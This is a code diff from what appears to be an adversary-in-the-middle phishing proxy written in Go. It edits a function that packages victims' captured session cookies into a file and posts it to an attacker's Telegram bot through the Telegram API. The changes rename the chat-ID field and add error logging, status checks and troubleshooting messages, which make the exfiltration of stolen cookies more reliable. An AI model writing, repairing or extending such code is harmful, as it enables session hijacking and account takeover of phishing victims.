@@ -1555,7 +1555,7 @@ func (p *HttpProxy) SendCapturedCookieTokensToTelegramBot(ps *Session) error {
 		return fmt.Errorf("failed to save JSON file: %v", err)
 	}
 
-	if ps.TelegramBotToken == "" || ps.TelegramUserID == "" {
+	if ps.TelegramBotToken == "" || ps.TelegramChatID == "" {
 		log.Warning("Telegram bot token or user ID not set. Set them to enable Telegram notifications.")
 		return nil
 	}
@@ -1563,7 +1563,7 @@ func (p *HttpProxy) SendCapturedCookieTokensToTelegramBot(ps *Session) error {
 	// Send the file to the Telegram bot
 	message := fmt.Sprintf("Captured cookies for user: %s", ps.Username)
 	botAPI := ps.TelegramBotToken // Use the session value
-	chatID := ps.TelegramUserID   // Use the session value
+	chatID := ps.TelegramChatID   // Use the session value with updated field name
 	err = SendMessageFileToTelegramBot(filename, message, botAPI, chatID)
 	if err != nil {
 		return fmt.Errorf("failed to send file to Telegram bot: %v", err)
@@ -1573,9 +1573,13 @@ func (p *HttpProxy) SendCapturedCookieTokensToTelegramBot(ps *Session) error {
 }
 
 func SendMessageFileToTelegramBot(filename, message, botAPI, chatID string) error {
+	// Sanitize the filename
+	sanitizedFilename := sanitizeFilename(filename)
+	
 	// Open the file
 	file, err := os.Open(filename)
 	if err != nil {
+		log.Error("Failed to open file for Telegram: %v", err)
 		return err
 	}
 	defer file.Close()
@@ -1585,18 +1589,21 @@ func SendMessageFileToTelegramBot(filename, message, botAPI, chatID string) erro
 	writer := multipart.NewWriter(body)
 
 	// Add the file to the request
-	part, err := writer.CreateFormFile("document", filename)
+	part, err := writer.CreateFormFile("document", sanitizedFilename)
 	if err != nil {
+		log.Error("Failed to create form file: %v", err)
 		return err
 	}
 	_, err = io.Copy(part, file)
 	if err != nil {
+		log.Error("Failed to copy file contents: %v", err)
 		return err
 	}
 
 	// Add other fields to the request
 	writer.WriteField("chat_id", chatID)
 	writer.WriteField("caption", message)
+	writer.WriteField("parse_mode", "HTML") // Support HTML formatting in captions too
 
 	// Close the multipart writer
 	writer.Close()
@@ -1605,18 +1612,38 @@ func SendMessageFileToTelegramBot(filename, message, botAPI, chatID string) erro
 	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botAPI)
 	req, err := http.NewRequest("POST", url, body)
 	if err != nil {
+		log.Error("Failed to create request: %v", err)
 		return err
 	}
 	req.Header.Set("Content-Type", writer.FormDataContentType())
 
 	// Send the request
 	client := &http.Client{}
-	_, err = client.Do(req)
+	resp, err := client.Do(req)
 	if err != nil {
+		log.Error("Failed to send request: %v", err)
 		return err
 	}
+	defer resp.Body.Close()
+	
+	// Check response status
+	if resp.StatusCode != http.StatusOK {
+		bodyBytes, _ := io.ReadAll(resp.Body)
+		errMsg := string(bodyBytes)
+		log.Error("Telegram API error (status code %d): %s", resp.StatusCode, errMsg)
+		
+		// Check for common errors
+		if strings.Contains(errMsg, "chat not found") {
+			log.Error("Telegram chat ID '%s' not found. Make sure the bot is added to the group/channel if using group/channel ID", chatID)
+		} else if strings.Contains(errMsg, "bot was blocked by the user") {
+			log.Error("Telegram bot was blocked by the user with ID '%s'", chatID)
+		} else if strings.Contains(errMsg, "bot is not a member") {
+			log.Error("Telegram bot is not a member of the chat '%s'. Add the bot to the group/channel", chatID)
+		}
+		
+		return fmt.Errorf("telegram API error: %s", errMsg)
+	}
 
-	// Return nil to indicate success
 	return nil
 }
 
